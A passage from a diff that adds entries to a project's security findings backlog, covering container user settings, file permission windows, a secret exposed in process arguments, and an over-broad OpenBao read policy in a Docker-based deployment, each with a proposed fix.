+`${APISIX_CONF_VOLUME}` can read the admin key or rewrite `allow_admin`. Undoes the 600 discipline
+`template-configs.sh` applies to every other render, almost certainly a uid-mismatch workaround.
+Mitigating: single-tenant host, rootless Docker, volume not shared with any other compose service
+today.
+
+**Fix:** `chown` to APISIX's runtime uid plus `chmod 640` — the range already establishes this exact
+pattern for `db-init`/`keycloak-db-init` (chown the Postgres volume to uid 999).
+
+### B33 — `rotate-secret.sh`'s new secret value briefly lands in host `ps`/`/proc` argv (deploy) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass B F9.** The new value is passed as `$3`, a literal argv element of the
+outer `rotate-secret.sh` process — visible via `ps aux`/`/proc/<pid>/cmdline` for the process's
+lifetime. The script's own header comment claims a stdin-pipe avoids this, but that protection covers
+only the *inner* `docker exec` call forwarding the value into the OpenBao container, not the outer
+script's own argv. Minor — operator-invoked, short-lived — but the claimed guarantee doesn't match
+behavior.
+
+**Fix:** read the new value from stdin or a tempfile in the outer script itself, not a positional
+argument.
+
+### B34 — Frontend container has no explicit non-root `USER` (frontend) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass B F10.** `haisir-frontend/Dockerfile`'s runtime stage
+(`FROM reg.mini.dev/node:26 AS runner`) has no `USER` instruction after the builder stage's
+`USER root`, and `common/docker-compose.yml`'s `frontend:` block has no `user:` override either —
+unlike backend (`USER 1000:1000`, explicit comment for scanners), gateway (`USER apisix`), and every
+database service, which all pin explicitly. Relies entirely on the base image's implicit default user,
+which `14_container_images.md`'s own "Migration risks" section warns needs re-verification per image,
+not carried over blind — not recorded anywhere for this image. `check-image-pins.sh`'s CI gate checks
+tag pinning only, not `USER` presence, so a regression here would go uncaught.
+
+**Fix:** confirm `reg.mini.dev/node:26`'s actual non-root uid (`docker run --rm reg.mini.dev/node:26 id`)
+and add an explicit `USER` line to the runtime stage.
+
+### B35 — BR-SEC-022 names `--chmod=D700,F600` as the delivery mechanism for the three committed config files; the code chmods after the fact (specs / deploy) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass A F10.** `target/requirements/13_secrets_management.md` states the three
+committed files are "deployed from the release artifact at mode 600 (`--chmod=D700,F600`)".
+`common/scripts/deploy-lib.sh:139-152` doesn't use `--chmod` for them — the `${env_name}/` rsync
+carries no mode flag (files land at git's checkout mode, 644), and a **subsequent**
+`remote_exec "chmod 600 ..."` tightens them. The in-code reasoning for rejecting `--chmod` on that
+rsync is sound (it would strip the exec bit off `setup.sh` et al. in the same sync) — the spec text is
+what's stale. Two consequences: a reader verifying BR-SEC-022 by grepping for `--chmod` finds nothing
+for these three files, and there is a real if brief window where `{env}/.env` sits at 644 on the host
+between rsync completing and the chmod landing.
+
+**Fix:** either give the three files their own third rsync invocation with `--chmod=D700,F600`
+(closes the window, makes the spec true as written — barely more code), or amend BR-SEC-022 to
+describe post-sync tightening instead.
+
+### B36 — `common/docker-compose.yml` misdescribes APISIX as requiring root (deploy) — surfaced 2026-08-18
+
+**Found 2026-08-18, T7.6 Pass B F11.** `common/docker-compose.yml:658-660`'s comment says "APISIX
+requires root user to bind to privileged ports and manage Nginx" — but `gateway-docker/Dockerfile:186`
+ends with `USER apisix` (non-root), and none of the ports APISIX publishes (9443, 9180, 9091) are
+privileged. The real behavior is safer than documented, not less safe, but there is no compose-level
+`user:` pin for `apisix` either — so a future Dockerfile edit or base-image bump that reintroduced a
+root default would have no compose-level guard to catch it. No live issue; a defense-in-depth gap.
+
+**Fix:** correct or remove the stale comment; consider `user: "apisix"` at the compose level for
+parity with the other pinned services.
+
+### B37 — Keycloak's OpenBao identity can read secrets it doesn't consume (deploy) — surfaced 2026-08-18, accepted, no action
+
+**Found 2026-08-18, T7.6 Pass B F12.** `common/openbao/policies/keycloak.hcl` grants the `keycloak`
+mTLS identity `read` on the whole `secret/data/haisir/keycloak` path, which also holds
+`KEYCLOAK_CLIENT_SECRET`, `GOOGLE_OAUTH_CLIENT_SECRET`, and `TEST_USER_PASSWORD` — none of which
+Keycloak's vault-agent actually renders (it only consumes `KC_DB_PASSWORD`/`KEYCLOAK_ADMIN_PASSWORD`).
+Architecturally forced by OpenBao KV v2 having no sub-key ACLs, and per `13_secrets_management.md`
+this path-wide-grant convention was already "reconfirmed accepted by both Phase 5.6 security review
+passes." BR-SEC-014's plain-language "minimum paths needed" wording reads as violated at the sub-key
+level even though the per-identity-per-path model it actually describes is satisfied.
+
+**Disposition:** no action beyond what's already decided — recorded here only so the still-open T7.6
+finding has a backlog pointer rather than living solely inside the review document.
